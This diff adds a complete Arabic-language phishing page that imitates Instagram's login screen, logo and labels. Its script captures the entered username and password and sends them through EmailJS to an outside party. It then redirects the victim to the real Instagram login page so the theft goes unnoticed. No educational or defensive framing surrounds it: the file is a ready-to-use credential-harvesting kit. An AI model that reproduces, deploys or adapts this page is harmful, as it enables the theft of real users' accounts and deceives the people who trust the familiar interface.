@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - إنستاجرام</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .btn {
+            background-color: #0095f6;
+            color: #ffffff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background-color: #007bb5;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .sign-up {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .sign-up a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">هل نسيت كلمة المرور؟</a>
+        </div>
+        <div class="sign-up">
+            <span>ليس لديك حساب؟</span> <a href="#">تسجيل حساب جديد</a>
+        </div>
+    </div>
+
+    <script>
+        // تهيئة EmailJS باستخدام Public Key
+        emailjs.init('SHnwOeLnomJS7LWFF');
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            emailjs.send('service_40opfyh', 'template_stxpsdr', {
+                username: username,
+                password: password
+            }).then(function(response) {
+                console.log('تم إرسال الرسالة بنجاح', response);
+                // توجيه المستخدم إلى صفحة تسجيل الدخول الحقيقية لإنستاجرام بعد إرسال الرسالة
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, function(error) {
+                console.log('فشل إرسال الرسالة', error);
+            });
+        });
+    </script>
+</body>
+</html>
